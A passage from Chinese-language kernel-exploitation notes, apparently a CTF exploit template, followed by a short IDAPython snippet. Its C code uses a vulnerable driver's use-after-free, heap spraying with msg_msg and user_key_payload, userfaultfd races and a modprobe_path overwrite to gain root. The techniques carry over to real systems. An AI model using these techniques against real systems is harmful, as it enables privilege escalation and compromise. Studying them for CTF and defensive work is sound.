 * https://elixir.bootlin.com/linux/v6.1/source/ipc/msg.c#L848
 * https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090
 */
 struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;    // message text大小
    struct msg_msgseg *next;
    void *security; // 由于未开启SELinux，该字段恒为0
};
int send_msg(size_t size, const char *content) {

    int qid;
    struct _msgbuf {
        long mtype;
        char mtext[size - sizeof(struct msg_msg)];
    } msg;

    // 创建
    assert((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) != -1);

    msg.mtype = 1;
    strncpy(msg.mtext, content, size - sizeof(struct msg_msg));
    assert(msgsnd(qid, &msg, sizeof(msg.mtext), 0) != -1);

    printf("[send_msg] msgget = %d\n", qid);
    fflush(stdout);

    return qid;
}
void *recv_msg(int qid, size_t size) {

    void *memdump;

    assert((memdump = malloc(size)) != NULL);

    if(msgrcv(qid, memdump, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == -1) {
        perror("msgrcv");
        return NULL;
    }

    return memdump;
}
void *recv_msg_nocopy(int qid, size_t size) {

    void *memdump;

    assert((memdump = malloc(size)) != NULL);

    if(msgrcv(qid, memdump, size, 0, IPC_NOWAIT | MSG_NOERROR) == -1) {
        perror("msgrcv");
        return NULL;
    }

    return memdump;
}



/* struct user_key_payload读
 * 结构体:
 *        struct user_key_payload {
 *        	struct rcu_head	rcu;		// RCU destructor
 *        	unsigned short	datalen;	// length of this data
 *        	char		        data[] __aligned(__alignof__(u64)); // actual data
 *        };
 * 
 * 条件：
 *      1. 驱动中存在UAF，块大小为[0x18, 0x10000]，可以更改内存的[0x10, 0x14)处的值
 * 
 * 参数:
 *      1. spray_addkey():@payload，即用户上传的key内容，被复制到data部分
 *      2. spray_addkey():@size，即内核要申请的data大小,h. 注意，spray_addkey()中，
 * 内核会申请两个大小相近的块，`kvmalloc(@size, GFP_KERNEL)`和
 * `kmalloc(sizeof(struct user_key_payload) + @size, GFP_KERNEL)`
 * 
 * 返回值：
 *      1. spray_addkey():@ret，即创建的key的唯一表示
 * 
 * 参考：
 * https://www.anquanke.com/post/id/228233#h3-10
 * https://github.com/Markakd/n1ctf2020_W2L/blob/main/leak.c
 * https://elixir.bootlin.com/linux/v6.1/source/security/keys/keyctl.c#L74
 * https://elixir.bootlin.com/linux/v6.1/source/security/keys/key.c#L816
 * https://elixir.bootlin.com/linux/v6.1/source/security/keys/user_defined.c#L59
 */
#define KEY_MAX_DESC_SIZE 4096
struct callback_head {
	struct callback_head *next;
	void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __attribute__ ((__aligned__(sizeof(__u64)))); /* actual data */
};
key_serial_t spray_addkey(const char *payload, uint32_t size)
{
  char *payload_buf;
  key_serial_t key;

  /* 减去struct user_key_payload头，确保内核申请的大小为
   * @size
   */
  assert(size >= sizeof(struct user_key_payload));
  size -= sizeof(struct user_key_payload);

  assert((payload_buf = malloc(size)) != NULL);
  strncpy(payload_buf, payload, size);

  assert((key = syscall_x64(SYS_add_key, "user", "kernel-pwn-key", payload_buf, size,
                        KEY_SPEC_PROCESS_KEYRING)) != -1);

  printf("[spray_addkey] add_key = %x\n", key);
  fflush(stdout);

  return key;
}
void *spray_readkey(key_serial_t key, uint32_t size)
{
  void *payload;

  assert((payload = malloc(size)) != NULL);

  assert(syscall_x64(SYS_keyctl, KEYCTL_READ, key, payload, size, 0) == size);

  return payload;
}

/* 本次exp的符号定义
 */
#define VULN_WRITE		0x1737
#define VULN_READ		0x1738
#define VULN_ALLOC		0x1739
#define VULN_FREE		0x173A

long long *modprobe_path = (long long*) 0xffffffff82651120;
long long fake_modprobe_path = 0x612f706d742f;

typedef struct {
	long long *addr;
	long long val;
} Data;

void *uf_handler(void *page)
{
    Data *data = (Data *)page;
    data->addr = modprobe_path;
    data->val = fake_modprobe_path;
    sleep(5);
    return NULL;
}

void *uf_thread(void *arg)
{
    assert(ioctl(gfd1, VULN_WRITE, gaddr1) == 0);
    return NULL;
}

int main(void)
{

    /* 尝试使用modprobe进行提权
     */
    //int fd;
    //Data data;

    //assert((fd = open("/dev/vuln", O_RDWR)) >= 0);

    //data.addr = modprobe_path;
    //data.val = fake_modprobe_path;

    //assert(ioctl(fd, VULN_WRITE, &data) == 0);
    //modprobe_exp();




    ///* 尝试使用userfaultfd扩大条件竞争
    // */
    //Data data;
    //long long buf;
    //uint64_t len;
    //pthread_t thread;

    //len = 0x1000;
    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);

    //// 注册userfaultfd，并通过ur_thr触发page fault
    //assert((gaddr1 = mmap(NULL, len, PROT_READ | PROT_WRITE,
    //                    MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0))
    //       != MAP_FAILED);
    //thread = userfaultfd_exp(gaddr1, len, uf_thread, uf_handler);

    //// 此时page fault还未处理完，条件竞争读取modprobe_path值
    //data.addr = modprobe_path;
    //data.val = (long long)&buf;
    //assert(ioctl(gfd1, VULN_READ, &data) == 0);
    //assert(buf != fake_modprobe_path);

    //// 等待uf_thr终止
    //assert(pthread_join(thread, NULL) == 0);
    //modprobe_exp();





    ///* 尝试利用struct msg_msg结构体
    // * 进行数据读取或写入
    // */
    //Data data;
    //char *kbuf1, *kbuf2;
    //int qid, size = 0x80;
    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);

    //// 内核态申请0x80大小的内存
    //data.val = size;
    //assert(ioctl(gfd1, VULN_ALLOC, &data) == 0)
    //kbuf1 = (char *)data.addr;

    //// 制造UAF
    //assert(ioctl(gfd1, VULN_FREE, &data) == 0)

    //// 开始heap spray
    //qid = send_msg_str(size, "hhaawwkk1");

    //// 利用UAF修改struct msg_msg的m_ts字段
    //data.addr = (long long*)(kbuf1 + offsetof(struct msg_msg, m_ts));
    //data.val = 0x1000;
    //assert(ioctl(gfd1, VULN_WRITE, &data) == 0);

    //assert((kbuf2 = recv_msg_nocopy(qid, 0x1000)) != NULL);
    //assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x13]);





    ///* 尝试利用struct user_key_payload结构体
    // * 进行数据读取或写入
    // */
    //Data data;
    //char *kbuf1, *kbuf2;
    //int size = 0x70;
    //key_serial_t key;

    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);

    //// 内核态申请0x80大小的内存
    //data.val = size;
    //assert(ioctl(gfd1, VULN_ALLOC, &data) == 0)
    //kbuf1 = (char *)data.addr;

    //// 制造UAF
    //assert(ioctl(gfd1, VULN_FREE, &data) == 0)

    //// 开始heap spray
    //key = spray_addkey("hhaawwkk1", size);

    //// 利用UAF修改struct user_key_payload的datalen字段
    //data.addr = (long long*)(kbuf1 + offsetof(struct user_key_payload, datalen));
    //data.val = 0x1000;
    //assert(ioctl(gfd1, VULN_WRITE, &data) == 0);

    //kbuf2 = spray_readkey(key, 0x1000);
    //assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x15]);
    return 0;
}
```

# IDA

  IDA是世界上顶级的交互式反汇编工具，往往使用**IDA**静态分析程序，从而理清程序中的代码组织结构，并统计相关资源信息

## IDAPython

  这是IDA的一个插件，允许IDA执行相关的*python*脚本信息。其中，该插件提供了大量的[IDA接口](https://hex-rays.com/products/ida/support/idapython_docs/frames.html)，从而可以方便的获取程序的相关信息，我们将其整理成如下模板
  ```python
import ida_bytes

'''
	获取虚拟地址处的1字节的值
	返回的是整形
'''
val = ida_bytes.get_byte(address)
  ```